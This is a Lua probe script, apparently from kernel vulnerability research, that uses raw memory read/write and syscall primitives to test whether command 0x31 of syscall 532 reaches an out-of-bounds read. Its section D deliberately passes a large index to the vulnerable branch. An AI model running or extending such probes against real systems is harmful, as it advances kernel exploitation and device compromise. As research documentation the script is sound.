-- CRASH_CLASS: LOW
-- PROBE 1242a: is command 0x31 reachable on syscall 532?
-- Static reading (docs/SYS532_OOB_GATE_14_10.md): the only unbounded caller index in
-- the image is at 532+0xaf06d9 (movzx eax,word ptr [rax+rcx*2+4]), and that
-- instruction sits on the cmd == 0x31 branch (af0688 cmp r14d,0x31). The other
-- commands 0x18-0x1E/0x20/0x2F take separate early exits at 0xaf00f6-0xaf0117, so
-- 87a status codes say nothing about 0x31: that command was never passed to the
-- kernel. This probe passes it, with the selector in 0x10..0x16 (the only accepted
-- range) and a copyout buffer in arg2, and reads back the status dword.
--
-- What the status means:
--   0x800D0204 -> an earlier handle check refused arg0
--   0x800D0203 -> the id lookup at 0x3CF7E38 missed (the table is boot-populated)
--   0x800D0208 -> size/param reject     0x800D0219 -> sandboxed
--   0 / other  -> something proceeded; the buffer tells more
-- Gate 4, proc+0xc81 != 0, is measured as 0 for our processes, so even a fully
-- reachable 0x31 pins the index to 2. This probe measures gates 1-3.
print("=== PROBE 1242a: syscall 532 command 0x31 ===")
local function N(v) if type(v)=="table" and v.tonumber then return v:tonumber() end return tonumber(v) or 0 end
local function mk(n) local t={} for k,v in pairs(syscall.pipe) do t[k]=v end t.syscall_no=n setmetatable(t,getmetatable(syscall.pipe)) return t end
local function ES() local ok,s=pcall(function() return get_error_string() end) if ok then return tostring(s) end return "?" end
local function rd(a) local ok,v=pcall(function() return N(memory.read_dword(a)) end) if ok then return v end return -1 end
local function wd(a,v) pcall(function() memory.write_dword(a,v) end) end
local function wq(a,hi,lo) pcall(function() memory.write_qword(a,uint64(string.format("0x%X%08X",hi,lo))) end) end
local function hilo(v) if type(v)=="table" and v.h then return v.h,v.l end return 0,N(v) end

print(string.format("[0] pid=%d", N(mk(20)())))
local buf = memory.alloc(0x100)
local idx = memory.alloc(8)
local function clr() pcall(function() for i=0,0xF8,4 do memory.write_dword(buf+i,0xCDCDCDCD) end end) end
local function show()
  local s = ""
  for i=0,0x1C,4 do s = s .. string.format(" %08X", rd(buf+i)) end
  return s
end

local function call532(tag, cmd, sel, indexv)
  clr(); wq(idx, 0, indexv)
  print(string.format("  -- %s: cmd=0x%X sel=0x%X index=0x%X", tag, cmd, sel, indexv))
  local ok, rv = pcall(function() return mk(532)(uint64(cmd), uint64(sel), uint64(buf), uint64(idx), uint64(0)) end)
  if not ok then print("     PCALL-FAIL") return end
  local h,l = hilo(rv)
  print(string.format("     ret=0x%08X_%08X err=%s buf:%s", h, l, ES(), show()))
end

print("[A] control: commands 87a reports as reachable, to prove the shape reaches the handler")
call532("cmd 0x18 sel 0", 0x18, 0x0, 0)
call532("cmd 0x20 sel 0", 0x20, 0x0, 0)
print("[B] the gated branch: cmd 0x31, every accepted selector")
for _, sel in ipairs({0x10, 0x11, 0x12, 0x13, 0x14, 0x15, 0x16}) do
  call532(string.format("cmd 0x31 sel 0x%X", sel), 0x31, sel, 4)
end
print("[C] out-of-range selectors on the same branch")
call532("cmd 0x31 sel 0x0", 0x31, 0x0, 4)
call532("cmd 0x31 sel 0x17", 0x31, 0x17, 4)
print("[D] large index on the branch that would do the OOB read")
call532("cmd 0x31 sel 0x10 idx 0x1000", 0x31, 0x10, 0x1000)
print("[E] command 0x32, just past the branch")
call532("cmd 0x32", 0x32, 0x10, 4)
print("=== DONE ===")
